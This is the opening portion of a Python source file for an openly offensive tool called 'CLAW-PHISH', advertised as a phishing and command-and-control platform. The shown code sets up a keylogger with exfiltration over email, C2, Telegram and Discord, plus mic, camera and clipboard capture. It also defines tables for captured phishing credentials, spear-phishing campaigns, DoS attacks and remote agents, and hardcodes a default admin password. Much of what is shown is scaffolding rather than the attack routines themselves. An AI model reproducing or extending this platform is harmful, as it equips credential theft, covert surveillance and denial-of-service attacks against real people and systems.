#!/usr/bin/env python3
"""
🦀 CLAW-PHISH v5.0.0 - Ultimate Phishing & Command & Control Platform
Author: Ian Carter Kulani
Version: 5.0.0

A complete cybersecurity automation platform featuring:
- 21000+ Security Commands
- Multi-Platform Bot Integration (Discord, Telegram, WhatsApp, Signal, Google Chat, Slack, iMessage, Web)
- Advanced Keylogger with PDF/Email/HTML Exfiltration
- Spear Phishing Email Campaigns with Templates
- REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP)
- Nikto Web Vulnerability Scanner
- Social Engineering Suite with 100+ Phishing Templates
- SSH Remote Access via All Platforms
- Advanced IP Management & Threat Detection
- Beautiful Web Dashboard with Real-time Monitoring
- Graphical Reports & Statistics
- DOS/DDOS Attack Capabilities
- Agent Mode with Command & Control
- Advanced Network Management & Traffic Monitoring
- PDF/Email/Link-based Keylogger Deployment
- IP to Domain Translation & Hosting
- Blue & White Terminal Web Application
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import dns.resolver
import dns.reversename
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from http.server import BaseHTTPRequestHandler, HTTPServer

# =====================
# VERSION & METADATA
# =====================
VERSION = "5.0.0"
NAME = "CLAW-PHISH"
AUTHOR = "Ian Carter Kulani"
DESCRIPTION = "Ultimate Phishing & Command & Control Platform"

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Keylogger
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Google Chat
try:
    from httplib2 import Http
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# WhatsApp (using pywhatkit or selenium)
try:
    import pywhatkit
    WHATSAPP_AVAILABLE = True
except ImportError:
    WHATSAPP_AVAILABLE = False

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# BeautifulSoup for email parsing
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# =====================
# THEME (Crab Red & White with Cyberpunk Accents)
# =====================
class Colors:
    PRIMARY = '\033[91m'      # Red
    SECONDARY = '\033[95m'    # Magenta
    ACCENT = '\033[97m'       # White
    SUCCESS = '\033[92m'      # Green
    WARNING = '\033[93m'      # Yellow
    ERROR = '\033[91m'        # Red
    INFO = '\033[94m'         # Blue
    DARK = '\033[90m'         # Dark Gray
    WHITE = '\033[97m'        # White
    BLUE = '\033[94m'         # Blue
    CYAN = '\033[96m'         # Cyan
    RED = '\033[91m'          # Red
    GREEN = '\033[92m'        # Green
    MAGENTA = '\033[95m'      # Magenta
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    BG_RED = '\033[41m'
    BG_WHITE = '\033[47m'

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".claw_phish"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "claw_phish.db")
LOG_FILE = os.path.join(CONFIG_DIR, "claw_phish.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "claw_phish_reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = "temp"
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, SPEAR_PHISHING_DIR,
    EMAIL_TEMPLATES_DIR, DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR,
    MODULES_DIR, NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
    DOMAIN_HOSTING_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - CLAW-PHISH - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("ClawPhish")

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    MIXED = "mixed"
    RANDOM = "random"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"

class DeploymentType(Enum):
    PDF = "pdf"
    EMAIL = "email"
    LINK = "link"
    EXECUTABLE = "executable"
    DOCUMENT = "document"
    MACRO = "macro"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class SpearPhishingCampaign:
    id: str
    name: str
    template: str
    subject: str
    from_email: str
    targets: List[Dict]
    sent_count: int = 0
    open_count: int = 0
    click_count: int = 0
    status: str = "draft"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    scheduled_time: Optional[str] = None

@dataclass
class KeylogEntry:
    timestamp: str
    text: str
    window: str
    process: str
    screenshot: Optional[str] = None

@dataclass
class Deployment:
    id: str
    name: str
    type: str
    payload: str
    target: str
    created_at: str
    delivered: bool = False
    opened: bool = False
    executed: bool = False

@dataclass
class DomainHost:
    id: str
    ip: str
    domain: str
    hosting_path: str
    created_at: str
    active: bool = True

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "html",
        "generate_graphics": True,
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
            "screenshot_interval": 60,
            "capture_clipboard": True,
            "capture_mic": False,
            "capture_cam": False
        },
        "web": {
            "enabled": False,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": True,
            "username": "admin",
            "password_hash": ""
        },
        "domain_hosting": {
            "enabled": False,
            "base_domain": "localhost",
            "port_range": [8000, 9000],
            "default_port": 8080
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200,
            "ddos_threshold": 1000
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "spear_phishing": {
            "enabled": True,
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "track_opens": True,
            "track_clicks": True
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_timeout": 60,
            "attack_types": ["syn", "udp", "http", "icmp"]
        },
        "agent": {
            "enabled": False,
            "server_url": "",
            "heartbeat_interval": 30,
            "command_poll_interval": 5
        },
        "network_monitor": {
            "enabled": True,
            "interface": "eth0",
            "promiscuous": False,
            "packet_capture_limit": 1000
        },
        "deployment": {
            "enabled": True,
            "pdf_template": "",
            "email_template": "",
            "link_expiry": 3600,
            "download_url": ""
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS domain_hosting (
                id TEXT PRIMARY KEY,
                ip TEXT NOT NULL,
                domain TEXT NOT NULL UNIQUE,
                hosting_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                port INTEGER DEFAULT 8080
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT,
                screenshot_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spear_phishing_campaigns (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                template TEXT NOT NULL,
                subject TEXT NOT NULL,
                from_email TEXT NOT NULL,
                targets TEXT,
                sent_count INTEGER DEFAULT 0,
                open_count INTEGER DEFAULT 0,
                click_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                scheduled_time DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS email_tracking (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id TEXT NOT NULL,
                target_email TEXT NOT NULL,
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                opened_at DATETIME,
                clicked_at DATETIME,
                FOREIGN KEY (campaign_id) REFERENCES spear_phishing_campaigns(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS dos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                ip_address TEXT,
                status TEXT DEFAULT 'offline',
                last_heartbeat DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                config TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agent_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                result TEXT,
                executed_at DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS deployments (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                payload TEXT,
                target TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered BOOLEAN DEFAULT 0,
                opened BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0,
                data TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                content TEXT,
                source TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS dns_cache (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT NOT NULL,
                ip TEXT NOT NULL,
                resolved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
    
    def _create_default_admin(self):
        try:
            import hashlib
            default_password = "claw_phish_2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                (ip, domain, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_domain_host(self, domain_host: 'DomainHost') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO domain_hosting 
                   (id, ip, domain, hosting_path, created_at, active, port)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (domain_host.id, domain_host.ip, domain_host.domain, domain_host.hosting_path,
                 domain_host.created_at, domain_host.active, 8080)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add domain host: {e}")
            return False
    
    def get_domain_hosts(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM domain_hosting WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM domain_hosting ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def resolve_domain(self, domain: str) -> Optional[str]:
        try:
            row = self.conn.execute(
                "SELECT ip FROM domain_hosting WHERE domain = ? AND active = 1",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            # Check DNS cache
            row = self.conn.execute(
                "SELECT ip FROM dns_cache WHERE domain = ? AND expires_at > datetime('now')",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            # Resolve using system DNS
            import socket
            ip = socket.gethostbyname(domain)
            if ip:
                self.conn.execute(
                    "INSERT INTO dns_cache (domain, ip, expires_at) VALUES (?, ?, datetime('now', '+1 hour'))",
                    (domain, ip)
                )
                self.conn.commit()
                return ip
            return None
        except:
            return None
    
    def resolve_ip(self, ip: str) -> Optional[str]:
        try:
            row = self.conn.execute(
                "SELECT domain FROM domain_hosting WHERE ip = ? AND active = 1",
                (ip,)
            ).fetchone()
            if row:
                return row['domain']
            
            # Try reverse DNS lookup
            try:
                import socket
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            return None
        except:
            return None
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
                       exit_code: int, execution_time: float):
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log SSH command: {e}")
    
